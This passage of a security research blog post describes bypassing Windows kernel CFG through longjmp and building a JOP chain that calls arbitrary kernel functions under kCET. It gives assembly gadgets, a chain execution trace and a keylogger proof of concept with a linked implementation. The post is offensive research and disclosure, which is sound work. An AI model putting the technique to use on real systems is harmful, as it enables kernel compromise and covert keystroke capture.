<p>This makes <code>longjmp</code> an interesting function to call to break the forward-edge integrity enforced by kCFG, if you have control over the 1st argument, and have a stack address leak.</p>
<h2 id="crafting-a-jop-chain">Crafting a JOP chain</h2>
<p>Now that kCFG is no longer a concern, we can start reusing kernel code by jumping on a gadget in the middle of a function (or instruction), just like a standard ROP chain. The gadget cannot end in a <code>ret</code>, because kCET is still in place, instead, it must end on an indirect <code>jmp</code> or a <code>call</code></p>
<p>Unlike ROP chains, JOP chains have an additional difficulty: there is nothing maintaining and updating the state of the execution of the chain. After the execution of a gadget, there is nothing that makes the control flow go to the next gadget. While it is possible to prepare the register used in the indirect <code>jmp</code> or <code>call</code> at the end of the gadget to branch to the next gadget directly, this doesn&rsquo;t work as the chain gets bigger. This would require preparing too many registers, and create additional constraints for the gadgets themselves. Given that JOP gadgets are also less convenient than ROP gadgets, this quickly makes creating JOP chain too complex, so an alternative solution is needed.</p>
<p>On a ROP chain, this is implicitly done when a <code>ret</code> instruction is executed at the end of a ROP gadget, the control flow goes to the next gadget, and at the same time, the stack pointer gets updated and now holds the address of the following gadget.</p>
<p>To replicate this behavior when creating a JOP chain, one can use a &ldquo;dispatcher&rdquo; gadget, whose role is to link together all the pieces of the JOP chain. When the execution of any gadget completes, the execution must come back to the dispatcher gadget, which will update the state of the JOP chain, and jump to the next gadget.</p>
<p>This gadget is crucial, and will affect the design of the entire chain of gadgets, so finding this gadget first is a good idea.</p>
<h3 id="jop-dispatchers">JOP dispatchers</h3>
<p>I identified two gadgets that could fulfill my requirements. The first one corresponds to the <code>nt!HalpLMIdentityStub</code> symbol:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">edi</span><span class="p">,</span> <span class="nb">edi</span>
</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">rcx</span><span class="p">,</span> <span class="kt">qword</span> <span class="p">[</span><span class="nb">rdi</span> <span class="o">+</span> <span class="mh">0x70</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="kt">qword</span> <span class="p">[</span><span class="nb">rdi</span> <span class="o">+</span> <span class="mh">0xa0</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">rdi</span><span class="p">,</span> <span class="kt">qword</span> <span class="p">[</span><span class="nb">rdi</span> <span class="o">+</span> <span class="mh">0x78</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">jmp</span> <span class="nb">rcx</span>
</span></span></code></pre></div><p>This could work starting from the first instruction, abusing the fact that SMAP is not enabled in most contexts on Windows, or starting from the second instruction. In this dispatcher, <code>rdi</code> serves  as the register that gets updated to hold the address of the next gadget.
The downside of this gadget is that the <code>rcx</code> register gets clobbered with the address of our target gadgets, which is inconvenient when targeting functions with the <code>fastcall</code> convention, where <code>rcx</code> holds the first argument.</p>
<p>I initially started using this gadget to make a working JOP chain, and then switched to the gadget I describe below because it is more powerful - but it is clearly possible to build a JOP chain around this dispatcher.</p>
<p>The second gadget I found is located at the end of <code>nt!_guard_retpoline_exit_indirect_rax</code>:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="nf">call</span> <span class="nb">rax</span>
</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="kt">qword</span> <span class="p">[</span><span class="nb">rsp</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">rcx</span><span class="p">,</span> <span class="kt">qword</span> <span class="p">[</span><span class="nb">rsp</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">rdx</span><span class="p">,</span> <span class="kt">qword</span> <span class="p">[</span><span class="nb">rsp</span> <span class="o">+</span> <span class="mh">0x30</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nv">r8</span><span class="p">,</span> <span class="kt">qword</span> <span class="p">[</span><span class="nb">rsp</span> <span class="o">+</span> <span class="mh">0x38</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nv">r9</span><span class="p">,</span> <span class="kt">qword</span> <span class="p">[</span><span class="nb">rsp</span> <span class="o">+</span> <span class="mh">0x40</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">add</span> <span class="nb">rsp</span><span class="p">,</span> <span class="mh">0x48</span>
</span></span><span class="line"><span class="cl"><span class="nf">jmp</span> <span class="nb">rax</span>
</span></span></code></pre></div><p>This gadget is slightly different. This time, the register holding the address of the next gadget is <code>rsp</code>. If we could execute this in a loop, this would be perfect, we would <code>call</code> an arbitrary address, update the arguments, then <code>jmp</code> back to the <code>call</code> instruction. Unfortunately, both the <code>jmp</code> and <code>call</code> instructions use the <code>rax</code> register.</p>
<p>To get around this, we start the execution on the <code>mov rax, qword [rsp + 0x20]</code> instruction, prepare the arguments for our target function, then jump to a JOP gadget that can update <code>rax</code> without modifying other registers. I picked the following gadget: <code>pop rax ; push rdi ; cmc ; jmp qword [rsi+0x3B] ;</code>. Only the <code>pop rax</code> and <code>jmp qword [rsi+0x3B]</code> are relevant, but JOP gadgets are less convenient. The <code>pop rax</code> instruction updates <code>rax</code> with the value of the target function, read from the stack, and <code>rsi</code> is prepared beforehand so that <code>*(rsi+0x3B)</code> points to the <code>call rax</code>. With this, we can loop around this gadget, and <code>call</code> arbitrary addresses, while also controlling every arguments.</p>
<p>There is also a big upside to this gadget: it uses a <code>call</code> instruction, which means it is possible to execute <code>ret</code>-ending gadgets, just like in a ROP chain!
Typical ROP gadgets, for example <code>pop rdi ; pop rsi ; ret ;</code> can work - <code>rdi</code> gets the return address pushed by the <code>call rax</code> instruction, <code>rsi</code> gets the value of interest, and the following address on the stack must be the address of the <code>mov rax, qword [rsp + 0x20]</code> instruction, to comply with kCET. This works because fundamentally, Intel CET checks the return value on the stack with the shadow stack, but not the address where it was originally pushed to.</p>
<p>With this, we can chain function calls and ROP gadgets</p>
<h3 id="saving-the-return-value--pivoting-stacks">Saving the return value &amp; pivoting stacks</h3>
<p>Now, the only thing that is missing is the ability to save and reuse the return value of function calls. The return value in <code>rax</code> immediately gets overwritten by the <code>mov rax, qword [rsp + 0x20]</code> instruction of our dispatcher.</p>
<p>To address this issue, the <code>call rax</code> instruction is not going to directly call the target function, but another gadget containing another <code>call</code> instruction. The one I picked is the following : <code>call rbp ; jmp qword [rsi-0x77] ;</code>. If <code>rbp</code> is setup to have the address of the target function, we can gain control of the execution after the target function, where <code>rax</code> has not been destroyed yet.</p>
<p>To save <code>rax</code>, I used this gadget:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="nf">mov</span> <span class="kt">qword</span> <span class="p">[</span><span class="nb">rsi</span><span class="p">],</span> <span class="nb">rax</span>
</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">rbx</span><span class="p">,</span> <span class="kt">qword</span> <span class="p">[</span><span class="nb">rsp</span><span class="o">+</span><span class="mh">0x60</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">rsi</span><span class="p">,</span> <span class="kt">qword</span> <span class="p">[</span><span class="nb">rsp</span><span class="o">+</span><span class="mh">0x68</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nf">add</span> <span class="nb">rsp</span><span class="p">,</span> <span class="mh">0x50</span>
</span></span><span class="line"><span class="cl"><span class="nf">pop</span> <span class="nb">rdi</span>
</span></span><span class="line"><span class="cl"><span class="nf">ret</span>
</span></span></code></pre></div><p>When it returns, kCET forces the return address to be the second instruction of the JOP dispatcher, but this is fine, because the return value has been saved at <code>*rsi</code>.</p>
<p>And, to actually reuse the return value, I split the JOP each time the return value needed to be reused. This way, I could <code>memcpy</code> the value saved to the next part of the payload, and used a <code>pop rsp ; ret ;</code> gadget to switch from one part of the payload to the next.</p>
<p>Here is a trace to follow of the execution flow of the JOP chain.</p>
<details>
    <summary>Click to expand</summary>
    <div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-nasm" data-lang="nasm"><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="kt">qword</span> <span class="p">[</span><span class="nb">rsp</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">]</span> <span class="c1">; set arguments for function call, and rax to the address of the &#34;pop rax&#34; gadget</span>
</span></span><span class="line"><span class="cl"><span class="c1">; ...</span>
</span></span><span class="line"><span class="cl"><span class="nf">jmp</span> <span class="nb">rax</span>
</span></span><span class="line"><span class="cl"><span class="nf">pop</span> <span class="nb">rax</span> <span class="c1">; set rax to the address of the &#34;call rbp ; jmp [rsi-0x77]&#34; gadget </span>
</span></span><span class="line"><span class="cl"><span class="c1">; ...</span>
</span></span><span class="line"><span class="cl"><span class="nf">jmp</span> <span class="kt">qword</span> <span class="p">[</span><span class="nb">rsi</span><span class="o">+</span><span class="mh">0x3b</span><span class="p">]</span> <span class="c1">; rsi previously set so that *(rsi+0x3b) points to the address of the &#34;call rax&#34; instruction in the jop dispatcher</span>
</span></span><span class="line"><span class="cl"><span class="nf">call</span> <span class="nb">rax</span>
</span></span><span class="line"><span class="cl">	<span class="nf">call</span> <span class="nb">rbp</span> <span class="c1">; previously set to the target function</span>
</span></span><span class="line"><span class="cl">		<span class="nf">nop</span> <span class="c1">; (Start of the target function)</span>
</span></span><span class="line"><span class="cl">		<span class="c1">; ...</span>
</span></span><span class="line"><span class="cl">		<span class="nf">ret</span>
</span></span><span class="line"><span class="cl">	<span class="nf">jmp</span> <span class="kt">qword</span> <span class="p">[</span><span class="nb">rsi</span><span class="o">-</span><span class="mh">0x77</span><span class="p">]</span> <span class="c1">; rsi previously set so that *(rsi-0x77) points to the address of the gadget used to save rax</span>
</span></span><span class="line"><span class="cl">	<span class="nf">mov</span> <span class="kt">qword</span> <span class="p">[</span><span class="nb">rsi</span><span class="p">],</span> <span class="nb">rax</span> <span class="c1">; return value gets saved at *rsi</span>
</span></span><span class="line"><span class="cl">	<span class="c1">; ...</span>
</span></span><span class="line"><span class="cl">	<span class="nf">ret</span>
</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="kt">qword</span> <span class="p">[</span><span class="nb">rsp</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">]</span> <span class="c1">; start of second gadget, </span>
</span></span><span class="line"><span class="cl"><span class="c1">; ...</span>
</span></span><span class="line"><span class="cl"><span class="nf">jmp</span> <span class="nb">rax</span>
</span></span><span class="line"><span class="cl"><span class="nf">pop</span> <span class="nb">rax</span> <span class="c1">; set rax to the address of &#34;add rsp, 0x50 ; pop rbp ; ret&#34; gadget</span>
</span></span><span class="line"><span class="cl"><span class="c1">; ...</span>
</span></span><span class="line"><span class="cl"><span class="nf">jmp</span> <span class="kt">qword</span> <span class="p">[</span><span class="nb">rsi</span><span class="o">+</span><span class="mh">0x3b</span><span class="p">]</span> <span class="c1">; rsi previously set so that *(rsi+0x3b) points to the address of the &#34;call rax&#34; instruction in the jop dispatcher</span>
</span></span><span class="line"><span class="cl"><span class="nf">call</span> <span class="nb">rax</span>
</span></span><span class="line"><span class="cl">	<span class="nf">add</span> <span class="nb">rsp</span><span class="p">,</span> <span class="mh">0x50</span>
</span></span><span class="line"><span class="cl">	<span class="nf">pop</span> <span class="nb">rbp</span> <span class="c1">; set rbp to the address of the 2nd target function, memcpy if we want to reuse the result of the 1st function call</span>
</span></span><span class="line"><span class="cl">	<span class="nf">ret</span>
</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="kt">qword</span> <span class="p">[</span><span class="nb">rsp</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">]</span> <span class="c1">; set arguments for the 2nd function call, and rax to the address of the &#34;pop rax&#34; gadget</span>
</span></span><span class="line"><span class="cl"><span class="c1">; ...</span>
</span></span><span class="line"><span class="cl"><span class="nf">jmp</span> <span class="nb">rax</span>
</span></span><span class="line"><span class="cl"><span class="nf">pop</span> <span class="nb">rax</span> <span class="c1">; set rax to address of &#34;call rbp ; jmp [rsi-0x77]&#34; </span>
</span></span><span class="line"><span class="cl"><span class="c1">; ...</span>
</span></span><span class="line"><span class="cl"><span class="nf">jmp</span> <span class="kt">qword</span> <span class="p">[</span><span class="nb">rsi</span><span class="o">+</span><span class="mh">0x3b</span><span class="p">]</span> <span class="c1">; rsi previously set so that *(rsi+0x3b) points to the address of call rax instruction in the jop dispatcher</span>
</span></span><span class="line"><span class="cl"><span class="nf">call</span> <span class="nb">rax</span>
</span></span><span class="line"><span class="cl">	<span class="nf">call</span> <span class="nb">rbp</span> <span class="c1">; previously set to the 2nd target function</span>
</span></span><span class="line"><span class="cl">		<span class="nf">nop</span> <span class="c1">; (Start of the target function)</span>
</span></span><span class="line"><span class="cl">		<span class="c1">; ...</span>
</span></span><span class="line"><span class="cl">		<span class="nf">ret</span>
</span></span><span class="line"><span class="cl">	<span class="nf">jmp</span> <span class="kt">qword</span> <span class="p">[</span><span class="nb">rsi</span><span class="o">-</span><span class="mh">0x77</span><span class="p">]</span> <span class="c1">; rsi previously set so that *(rsi-0x77) points to the address of the gadget used to save rax</span>
</span></span><span class="line"><span class="cl">	<span class="nf">mov</span> <span class="kt">qword</span> <span class="p">[</span><span class="nb">rsi</span><span class="p">],</span> <span class="nb">rax</span> <span class="c1">; return value gets saved at *rsi</span>
</span></span><span class="line"><span class="cl">	<span class="c1">; ...</span>
</span></span><span class="line"><span class="cl">	<span class="nf">ret</span>
</span></span><span class="line"><span class="cl"><span class="nf">mov</span> <span class="nb">rax</span><span class="p">,</span> <span class="kt">qword</span> <span class="p">[</span><span class="nb">rsp</span> <span class="o">+</span> <span class="mh">0x20</span><span class="p">]</span> <span class="c1">; start of third gadget, </span>
</span></span><span class="line"><span class="cl"><span class="c1">; ...</span>
</span></span></code></pre></div></div>
</details>

<p>Finally, to avoid running into paging issues, where a part of the JOP chain isn&rsquo;t paged in - which would result in a crash because page faults are not handled - I mapped all the parts of the payload in non-paged pool memory, using named pipes backing buffers.
With this, we have the ability to reuse kernel code to call arbitrary functions and execute ROP gadgets, and save and reuse return values - without ever breaking the constraints of kCET.</p>
<p>With this, we have the <strong>ability to reuse kernel code to call arbitrary functions and execute ROP gadgets, and save and reuse return values</strong> - without ever breaking the constraints of kCET.</p>
<h2 id="is-kernel-code-execution-really-useful-">Is kernel code execution really useful ?</h2>
<p>Now that we can achieve code execution thanks to code reuse, let&rsquo;s consider when it can be useful, compared to a data-only attack.</p>
<p>To me, there are two main reasons where this can useful.</p>
<p>The first use case is executing privileged instructions, and in particular, interacting with the hypervisor and VTL1. With data-only attack, this might be done using race conditions, were the backing data of a message is replaced before being sent, but it seems harder to implement and unreliable.</p>
<p>The second use case is when dealing with complex data structures. For instance, in my proof of concept below, I would have to create and edit page table entries - it is much more convenient to call the corresponding API and have it do the work for you.</p>
<p>Finally, while this technique can get arbitrary kernel code execution, it cannot be started by a callback if none of the arguments are controlled. This makes it unsuitable for intercepting process creation notifications, for example.</p>
<h2 id="proof-of-concept">Proof of concept</h2>
<p>To demonstrate the technique, using the &ldquo;admin-to-kernel&rdquo; arbitrary call primitive offered by the <a href="https://github.com/scrt/KexecDDPlus">KexecDDPlus</a> tool, I chose to build a payload that maps the keyboard state in userland to create a keylogger, as described in the  <a href="https://i.blackhat.com/BH-US-23/Presentations/US-23-Palmiotti-Boonen-Close-Encounters.pdf">Close Encounters of the Advanced Persistent Kind</a> presentation, with an <a href="https://eversinc33.com/posts/kernel-mode-keylogging.html">example implementation</a> on Windows 10.
This would be tedious to implement using a data-only attack.</p>
<p>I happen to have a kCET compatible CPU, so using Hyper-V, I setup a Windows 11 test environment, with kCET enabled:</p>
<div class="figure">
<p><img src="https://blog.slowerzs.net/images/Jumper/kcet_on.png" alt="Windows 11 setting to enabled kCET"></p>
</div>
<p>To start off the execution of the JOP chain, I used <code>longjmp</code> to get around kCFG, since the primitive offered by this ioctl gives full control over <code>rcx</code>.</p>
<p>Then, the execution of the JOP chain kicks off, the payload successively calls <code>win32ksgd!SGDGetUserSessionState</code>, adds a constant value to the result using a ROP gadget, to locate the map containing the state of the keyboard. Afterwards, a <code>MDL</code> describing the map is constructed using <code>IoAllocateMdl</code>, locked using <code>MmProbeAndLockPages</code>, and finally mapped to userland using <code>MmMapLockedPagesSpecifyCache</code>.
Finally, the map is polled in userland to have a working keylogger.</p>
<div class="figure">
<p><img src="https://blog.slowerzs.net/images/Jumper/key_log_win11.png" alt="Demonstration of the keylogger on Windows 11"></p>
</div>
<p>My implementation is available on <a href="https://github.com/Slowerzs/KeyJumper">Github</a>. While the offsets were created for Windows <code>22H2</code>, build version <code>22261.4890</code>, the most important gadgets, such as the dispatcher still exist on <code>24H2</code>, and the others, while not all directly present, all have similar gadgets that could replace them.</p>
<p>With all this, I think its clear that kernel code execution is not dead :)</p>



                    </div>
                </div>
            </div>
        </div>
    </div>

    


    

    

    <div id="modal" class="modal">
        <img id="modal-content" class="modal-content">
    </div>
    <script>

        if (typeof screen.orientation !== 'undefined') {
            
            var modal = document.getElementById('modal');

            modal.addEventListener('click', function (e) {
                if (e.target === e.currentTarget) {
                    modal.style.display = "none";
                    document.body.style.overflowY = "visible"
                }
            });
            document.addEventListener('keydown', function (e) {
                if (e.key === "Escape") {
                    modal.style.display = "none";
                    document.body.style.overflowY = "visible"
                }
            })

            document.addEventListener('click', function (e) {
                if (e.target.parentElement.parentElement.className.indexOf('figure') !== -1) {
                    var img = e.target;
                    var modalImg = document.getElementById("modal-content");
                    document.body.style.overflowY = "hidden"
                    modal.style.display = "flex";
                    modalImg.src = img.src;
                }
            });

        }


    </script>

    

</body>

</html>